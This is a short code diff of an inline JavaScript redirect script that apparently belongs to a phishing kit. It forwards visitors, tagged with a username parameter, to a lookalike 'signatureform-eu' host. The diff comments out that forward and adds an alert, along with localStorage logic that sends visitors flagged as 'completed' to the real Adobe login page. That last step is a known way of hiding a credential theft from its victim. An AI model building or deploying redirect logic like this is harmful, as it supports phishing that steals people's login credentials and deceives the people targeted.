@@ -2,11 +2,24 @@
   const qs = window.location.search;
   const urlParams = new URLSearchParams(qs);
 
+  // if the cookie is set, redirect 
+  if (localStorage.getItem("completed")) {
+    window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
+  }
+
+  if (urlParams.has("sc")) {
+    // set cookie
+    localStorage.setItem("completed", true);
+    // redirect to end site
+    window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
+  }
+
   if (urlParams.has("u")) {
     const u = urlParams.get("u");
-    window.location = "https://file.signatureform-eu.com/?username=" + u;
+    /// window.location = "https://file.signatureform-eu.com/?username=" + u;
   } else {
-    window.location = "https://file.signatureform-eu.com";
+    alert("hi");
+    // window.location = "https://file.signatureform-eu.com";
   }
   
 </script>
